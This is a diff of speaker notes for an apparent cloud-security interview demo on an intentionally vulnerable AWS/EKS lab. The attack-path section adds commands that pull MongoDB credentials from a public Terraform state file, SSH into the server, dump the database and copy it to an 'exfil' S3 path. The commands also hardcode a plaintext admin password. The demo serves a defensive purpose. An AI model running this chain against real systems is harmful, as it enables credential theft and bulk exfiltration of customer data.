@@ -127,6 +127,33 @@ print(json.dumps(docs, indent=2, default=str))
 
 "You can see the profile data — genres, movies watched, kids ages — all persisted in MongoDB."
 
+*(After showing MongoDB persistence — transition to infra tour)*
+
+"Let me quickly show you that this is genuinely running on Kubernetes — not just a local container."
+
+```bash
+# Show the running pod and which node it's on
+kubectl get pods -o wide
+
+# Show the full picture — deployment, service, ingress, cluster role binding
+kubectl get deployment,service,ingress,clusterrolebinding | grep movie-buddy
+
+# Show the ALB ingress — HTTPS cert, sticky sessions, subnet IDs
+kubectl describe ingress movie-buddy-ingress
+```
+
+*(Switch to AWS Console — EC2 → Load Balancers)*
+
+"This is the Application Load Balancer — you can see HTTPS on port 443, the ACM certificate attached, and it's routing traffic into the private subnets where EKS nodes sit."
+
+*(Switch to AWS Console — EKS → Clusters → movie-buddy)*
+
+"EKS cluster, two t3.medium nodes in private subnets. The cluster itself is managed — AWS runs the control plane, I just manage the node group and the workloads."
+
+*(Switch to AWS Console — EC2 → Instances → movie-buddy-mongodb)*
+
+"And the MongoDB server — EC2 instance in a public subnet. Ubuntu 20.04, intentionally outdated. You can already see one thing that should catch your eye: it has a public IP and it's in a public subnet. We'll come back to why that matters."
+
 **Slide content:** App mockup image + 3 bullet points: "Multi-agent AI (Claude Sonnet)" | "EKS on AWS, HTTPS" | "MongoDB persistent memory"
 
 **ChatGPT image prompt:**
@@ -134,31 +161,7 @@ Dark-themed chat UI mockup illustration. Split composition: left two-thirds show
 
 ---
 
-## Slide 6 — Business Benefits and Risks (3 min)
-
-**Speaker notes:**
-"Before we look at security in detail, let me frame the business context — because security findings only matter if you understand what they mean for the business.
-
-This environment has clear value: it's fully automated, reproducible, scalable. I can tear it down and redeploy the entire thing in about 30 minutes from a single Terraform command. That's real business agility.
-
-But the way it was built introduces risks with direct business impact:
-
-SSH open to the internet on the database server — this means any attacker, anywhere, can attempt to brute-force access to the machine that holds your customer data. There's no IP restriction, no VPN requirement.
-
-The EC2 instance has AdministratorAccess IAM role attached. If an attacker compromises that machine — through the open SSH, through a MongoDB vulnerability, any way — they immediately inherit full control of the entire AWS account. They can create new users, exfiltrate data, spin up crypto mining infrastructure, delete everything. One compromised VM becomes a compromised cloud account.
-
-The S3 bucket that holds database backups is publicly readable. And as we'll see shortly, it also contains something it shouldn't.
-
-Both MongoDB and the operating system are over a year out of date — meaning there are known, documented attack techniques for these versions available publicly."
-
-**Slide content:** Two columns — Benefits | Risks
-
-**ChatGPT image prompt:**
-Two-panel infographic on dark navy background (#0a0e1a). Left panel labeled "Business Value" — three items each with a green checkmark circle icon: "Automated Deployment", "Horizontally Scalable", "Full Audit Trail". Right panel labeled "Security Risks" — four items each with a red warning triangle icon: "SSH Exposed to Internet", "Over-Privileged IAM Role", "Credentials in Public S3", "Unpatched CVEs". Vertical electric blue (#00B4D8) dividing line between panels. White text, flat icon style. No decorative elements. Clean enterprise look. 16:9 widescreen.
-
----
-
-## Slide 7 — How I Built It — DevSecOps Pipeline — LIVE DEMO (5 min)
+## Slide 6 — How I Built It — DevSecOps Pipeline — LIVE DEMO (5 min)
 
 **Speaker notes:**
 "I built this using a full DevSecOps pipeline. Let me show you how it works."
@@ -173,11 +176,28 @@ Two-panel infographic on dark navy background (#0a0e1a). Left panel labeled "Bus
 
 *(Click into the Infra CI run — show Checkov findings, show the approval gate)*
 
-"The application pipeline triggers on code changes. Trivy scans the container for vulnerabilities, Docker builds the image for the correct platform — AMD64 for EKS — pushes it to ECR, and kubectl rolls out the new version to EKS automatically."
+"The application pipeline triggers on code changes. It first builds the Docker image locally on the runner — not yet in ECR — then Trivy scans that built image for vulnerabilities before it goes anywhere. Only after the scan completes does the image get pushed to ECR, and kubectl rolls out the new version automatically. The findings are always visible here in the GitHub UI, even if the pipeline continues."
 
-*(Click into App CI/CD run)*
+*(Click into App CI/CD run — show the Trivy scan step output with findings)*
 
-"Secrets are in two places: CI/CD credentials live in GitHub Secrets — never in the code. Application secrets — API keys and the MongoDB connection string — live in a Kubernetes Secret and are injected into the pod as environment variables at startup. Let me show you."
+"There's one more piece of infrastructure I want to call out — Terraform remote state. When Terraform runs locally on my laptop, it keeps a state file on disk: a record of every resource it has created, with all their IDs, addresses, and configuration values. That's how it knows what already exists in AWS versus what needs to be created or changed.
+
+But when the pipeline runs in GitHub Actions, it has no access to my laptop. So I migrated the state file to S3 — this bucket."
+
+*(Show in terminal or browser)*
+```bash
+aws s3 ls s3://movie-buddy-tfstate-329153220664/wiz-exercise/
+```
+
+"Now the pipeline can read and write state from anywhere. That's the right architectural decision for CI/CD. But it introduced a risk — and I want to flag it now, because we'll come back to it when we look at the attack path. The state file contains every resource detail Terraform tracks — including connection strings and credentials — in plain text. I'll show you exactly what that means in a few minutes.
+
+*(If asked — why does tfstate contain credentials?)*
+*"Terraform tracks the exact deployed state of every resource so it can detect drift. When you create a database user with a password via Terraform, it stores that password in the state file — otherwise it couldn't compare what's in code against what's actually running. Terraform doesn't encrypt state by default. It's a known design limitation."*
+
+*(If asked — why S3 and not something GitHub-native?)*
+*"GitHub Actions has no built-in state storage for Terraform — it's not a feature GitHub offers. Terraform supports pluggable backends: S3, Azure Blob, GCS, Terraform Cloud. For an AWS environment, S3 is the standard choice — same credentials you already have, cheap, durable. The better alternative is Terraform Cloud, which handles state with encryption and proper access control. But the key point: local state simply doesn't work when the pipeline runs on GitHub's servers. The mistake wasn't using S3. The mistake was making the bucket public."*
+
+Secrets are in two places: CI/CD credentials live in GitHub Secrets — never in the code. Application secrets — API keys and the MongoDB connection string — live in a Kubernetes Secret and are injected into the pod as environment variables at startup. Let me show you."
 
 ```bash
 kubectl get secrets
@@ -187,7 +207,58 @@ kubectl get secret movie-buddy-secrets -o jsonpath='{.data}' | python3 -m json.t
 **Slide content:** Pipeline flow diagram image
 
 **ChatGPT image prompt:**
-Horizontal pipeline flow diagram on dark navy background (#0a0e1a). Two parallel pipeline tracks stacked vertically, each with a label on the left. Top track labeled "Infra Pipeline": connected boxes left to right — "Git Push" → "Checkov Scan" (red security shield icon) → "Terraform Plan" (document icon) → "Manual Approval" (human/pause icon, amber color) → "Terraform Apply" → "AWS" (cloud icon). Bottom track labeled "App Pipeline": "Git Push" → "Trivy Scan" (red shield) → "Docker Build" → "ECR Push" → "kubectl rollout" → "EKS" (Kubernetes wheel icon). Electric blue (#00B4D8) arrows connecting boxes. Boxes in dark charcoal (#1e2433) with white text. Security scan steps have red accent border, deploy steps have green accent border. Flat vector style. 16:9 widescreen.
+Horizontal pipeline flow diagram on dark navy background (#0a0e1a). Two parallel pipeline tracks stacked vertically, each with a label on the left. Top track labeled "Infra Pipeline": connected boxes left to right — "Git Push" → "Checkov Scan" (red security shield icon) → "Terraform Plan" (document icon) → "Manual Approval" (human/pause icon, amber color) → "Terraform Apply" → "AWS" (cloud icon). Bottom track labeled "App Pipeline": "Git Push" → "Docker Build" → "Trivy Scan" (red shield, scans the built image) → "ECR Push" → "kubectl rollout" → "EKS" (Kubernetes wheel icon). Electric blue (#00B4D8) arrows connecting boxes. Boxes in dark charcoal (#1e2433) with white text. Security scan steps have red accent border, deploy steps have green accent border. Note: Trivy scan sits between Build and Push — image is scanned before it reaches ECR. Flat vector style. 16:9 widescreen.
+
+---
+
+## Slide 7 — Business Benefits and Risks — LIVE DEMO (3 min)
+
+**Speaker notes:**
+"Before we look at what the security tools found, let me frame the business context — because findings only matter if you understand what they mean for the business.
+
+This environment has real value: it's fully automated, reproducible, scalable. I can tear it down and redeploy everything in about 30 minutes from a single Terraform command. That's real business agility.
+
+But the way it was built introduces risks with direct business impact. And I want to show you these aren't theoretical — they're visible right now in the running environment.
+
+First — SSH open to the entire internet on the database server."
+
+```bash
+# Show the security group rule — port 22 open to 0.0.0.0/0
+aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+  --query "SecurityGroups[0].IpPermissions" --output table
+```
+
+"Any attacker, anywhere in the world, can attempt to reach this machine on port 22. No IP restriction, no VPN requirement.
+
+Second — the EC2 instance has AdministratorAccess attached."
+
+```bash
+# Show AdministratorAccess policy attached to the EC2 role
+aws iam list-attached-role-policies \
+  --role-name movie-buddy-ec2-role \
+  --query "AttachedPolicies[*].PolicyName" \
+  --output table
+```
+
+"If an attacker compromises this machine — through open SSH, through a MongoDB CVE, any way — they immediately inherit full control of the entire AWS account. One compromised VM becomes a compromised cloud account.
+
+Third — the Kubernetes pod has cluster-admin rights."
+
+```bash
+# Show the cluster-admin ClusterRoleBinding on the pod's service account
+kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
+```
+
+"This means if an attacker gains code execution inside the container — through a dependency vulnerability, a prompt injection attack on the AI, anything — they can do anything to the Kubernetes cluster: read all secrets, deploy new pods, delete workloads.
+
+Fourth — the S3 bucket is publicly readable, and as we'll see shortly, it also contains something it shouldn't.
+
+Both MongoDB and the OS are over a year out of date — known, documented attack techniques exist for these versions publicly."
+
+**Slide content:** Two columns — Benefits | Risks
+
+**ChatGPT image prompt:**
+Two-panel infographic on dark navy background (#0a0e1a). Left panel labeled "Business Value" — three items each with a green checkmark circle icon: "Automated Deployment", "Horizontally Scalable", "Full Audit Trail". Right panel labeled "Security Risks" — four items each with a red warning triangle icon: "SSH Exposed to Internet", "Over-Privileged IAM Role", "Credentials in Public S3", "Unpatched CVEs". Vertical electric blue (#00B4D8) dividing line between panels. White text, flat icon style. No decorative elements. Clean enterprise look. 16:9 widescreen.
 
 ---
 
@@ -200,9 +271,21 @@ Horizontal pipeline flow diagram on dark navy background (#0a0e1a). Two parallel
 
 "First, Checkov — this runs automatically every time I push infrastructure code, before anything touches AWS. It found 10 findings. The two most critical: SSH open to the entire internet on the EC2 instance, and AdministratorAccess IAM role attached to that same machine. In a real environment, these would block the pipeline — here I've set it to soft-fail intentionally so we can discuss the findings."
 
-*(Switch to AWS Console → Inspector)*
+*(Switch to AWS Console → Inspector → filter by EC2, Critical)*
 
-"AWS Inspector scanned both the EC2 instance and the container images in ECR. It found critical CVEs in MongoDB 4.4 and Ubuntu 20.04 — both end-of-life, both with known unpatched vulnerabilities. What does that mean in practice? There are documented attack techniques for these versions publicly available — any attacker can look them up. Inspector gives me severity scores and CVE links, but it doesn't tell me whether these vulnerabilities are actually reachable from outside."
+"AWS Inspector scanned the EC2 instance and found 26 critical CVEs. Inspector doesn't say 'Ubuntu 20.04 is outdated' as a single line — it enumerates every consequence of that decision: every package on that machine that has a known unpatched vulnerability. libssl and openssl — the encryption library — critical. libxml2, glibc, imagemagick — all critical.
+
+But the one I want to call your attention to is this one."
+
+*(Click into the libssh / libssh-4 finding)*
+
+"A critical CVE in libssh — the SSH library itself. On the same machine where port 22 is open to the entire internet. Inspector is telling us: not only is SSH exposed, but the SSH implementation has a known vulnerability. That combination is as bad as it gets.
+
+Inspector also scanned the container images in ECR."
+
+*(Switch to Inspector → filter by ECR Container Image)*
+
+"The running container image has a critical CVE in perl, plus multiple high-severity findings. These are vulnerabilities in packages inside the container — the application that's serving traffic right now at movie-buddy.app. Inspector gives me severity scores and CVE links, but it doesn't tell me whether these vulnerabilities are actually reachable from outside, or which one an attacker would use first. That context is missing."
 
 *(Switch to AWS Console → GuardDuty)*
 
@@ -247,9 +330,13 @@ aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate -
   | python3 -m json.tool | grep -A3 mongodb_url
 ```
 
-"The Terraform state file contains the MongoDB connection string — username and password — in plain text. And it's sitting in a publicly accessible bucket. Anyone who knows this bucket name can read this file and connect directly to the database. No credentials required at any step.
+"The Terraform state file contains the MongoDB connection string — username and password — in plain text. And it's sitting in a publicly accessible bucket. Now watch how far this goes."
 
-That's a four-step attack path: public S3 bucket → readable state file → exposed credentials → full database access. Checkov flagged the public bucket as one finding. It flagged missing encryption as another. But no tool connected these dots and said: together, these create a complete path from the public internet to your customer data.
+*(SSH into EC2, run mongodump, then aws s3 cp to exfiltrate)*
+
+"I just dumped the entire customer database to S3 — using the EC2's own IAM role to do it. No AWS credentials. No special tools. This chains three separate weaknesses: public S3 exposes the credentials. Open SSH on port 22 lets an attacker reach the server. And the AdministratorAccess IAM role means once they're on the machine, they own the entire AWS account — they don't even need their own credentials to exfiltrate data.
+
+Checkov flagged the public bucket as one finding. It flagged the IAM role as another. Inspector flagged the open SSH port. But no tool connected these three dots and said: together, these create a complete path from the public internet to a full database dump — using your own cloud infrastructure to stage the stolen data.
 
 This is precisely what Wiz was built to solve. Wiz builds a graph of your entire cloud environment — every resource, every permission, every network path — and uses that graph to identify which combinations of findings create real attack paths. Instead of ten isolated findings, you get three prioritized attack paths ranked by actual exploitability and business impact. Your security team stops triaging alerts and starts fixing what actually matters.
 
@@ -258,7 +345,7 @@ In CI/CD pipelines, you can add tools like Semgrep for code scanning, KICS for a
 **Slide content:** Fragmentation vs unified view image
 
 **ChatGPT image prompt:**
-Split composition on dark navy background (#0a0e1a). Left half labeled "Without Wiz" (muted, slightly gray tint): Six isolated tool icons scattered — Checkov, Trivy, Inspector, GuardDuty, Config, CloudTrail — each in its own separate dark box with no connections between them, red warning icons floating disconnected, chaotic arrangement suggesting fragmentation and alert fatigue. Right half labeled "With Wiz" (vivid, full color): A clean connected graph — five nodes labeled "Public Internet" → "Public S3 Bucket" → "Terraform State File" → "MongoDB Credentials" → "Database" — connected by a glowing red attack path arrow showing the full chain. Below the graph: "1 Critical Attack Path" in bold red. Vertical dividing line in electric blue (#00B4D8) between the two halves. Flat vector style. 16:9 widescreen.
+Split composition on dark navy background (#0a0e1a). Left half labeled "Without Wiz" (muted, slightly gray tint): Six isolated tool icons scattered — Checkov, Trivy, Inspector, GuardDuty, Config, CloudTrail — each in its own separate dark box with no connections between them, red warning icons floating disconnected, chaotic arrangement suggesting fragmentation and alert fatigue. Right half labeled "With Wiz" (vivid, full color): A clean connected graph — six nodes in a horizontal chain connected by glowing red attack path arrows: "Public Internet" → "Public S3 Bucket" → "Exposed Credentials" → "Open SSH (0.0.0.0/0)" → "EC2 + Admin IAM Role" → "Data Exfiltrated to S3". Each node is a dark charcoal (#1e2433) rounded box with white label. The final node "Data Exfiltrated to S3" has a red glow/border to emphasize the blast radius. Below the chain: "1 Critical Attack Path — 3 Chained Weaknesses" in bold red. Vertical dividing line in electric blue (#00B4D8) between the two halves. Flat vector style. 16:9 widescreen.
 
 ---
 
@@ -377,6 +464,22 @@ ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /etc/cron.d/mong
 ```
 *(Have these ready if challenged — show the S3 listing proactively during the attack path demo)*
 
+### Intentional weaknesses — live proof
+```bash
+# SSH open to entire internet — show security group rule
+aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+  --query "SecurityGroups[0].IpPermissions" --output table
+
+# AdministratorAccess IAM role on EC2
+aws iam list-attached-role-policies \
+  --role-name movie-buddy-ec2-role \
+  --query "AttachedPolicies[*].PolicyName" \
+  --output table
+
+# Cluster-admin ClusterRoleBinding on the pod
+kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
+```
+
 ### EC2 / MongoDB server
 ```bash
 # SSH to MongoDB server (demonstrates open SSH to internet — intentional weakness)
@@ -399,7 +502,7 @@ aws iam list-attached-role-policies \
   --output table
 ```
 
-### Attack path demo — public S3 → credentials → SSH → database
+### Attack path demo — public S3 → credentials → SSH → full database exfiltration
 ```bash
 # Step 1: Show S3 bucket is publicly readable (open in browser, no credentials)
 # URL: https://movie-buddy-db-backups.s3.amazonaws.com/
@@ -411,12 +514,24 @@ aws s3 ls s3://movie-buddy-tfstate-329153220664/wiz-exercise/
 aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
   | python3 -m json.tool | grep -A3 mongodb_url
 
-# Step 4: SSH into the EC2 server using the open SSH port (second weakness)
+# Step 4: SSH into the EC2 server — SSH is open to the entire internet (second weakness)
+# Note: say out loud "In practice an attacker would brute-force this or exploit a MongoDB CVE.
+# The point is: port 22 is open to 0.0.0.0/0, so they can try."
 ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
 
-# Step 5: Once inside EC2, connect to MongoDB using the credentials from Step 3
-# (MongoDB is on localhost from inside EC2)
-mongosh "mongodb://admin:MovieBuddy2024\!@localhost:27017" \
-  --eval "db.getSiblingDB('movie_buddy').profiles.find().pretty()"
+# Step 5 (run INSIDE the EC2 shell): Dump the entire database
+# Use 'mongo' not 'mongosh' — MongoDB 4.4 uses the old shell
+mongodump --host localhost --port 27017 \
+  -u admin -p 'MovieBuddy2024!' --authenticationDatabase admin \
+  --db movie_buddy --out /tmp/exfil
+
+# Step 6 (run INSIDE the EC2 shell): Exfiltrate to S3 — no AWS credentials needed
+# The EC2 has AdministratorAccess IAM role, so the AWS CLI just works (third weakness)
+tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
+aws s3 cp /tmp/movie_buddy_dump.tar.gz \
+  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
+
+# Step 7 (back in your local terminal): Confirm the dump landed in S3
+aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
 ```
-*(This chains two weaknesses: public S3 exposes credentials → open SSH provides access → full DB dump. Say out loud: "An attacker with just a browser and an SSH client can do everything I just did.")*
+*(This chains THREE weaknesses: public S3 exposes credentials → open SSH port 22 provides server access → AdministratorAccess IAM role means no AWS credentials needed to exfiltrate. Say out loud: "An attacker with a browser, an SSH client, and the AWS CLI just dumped your entire customer database to external storage — using your own cloud account to do it.")*
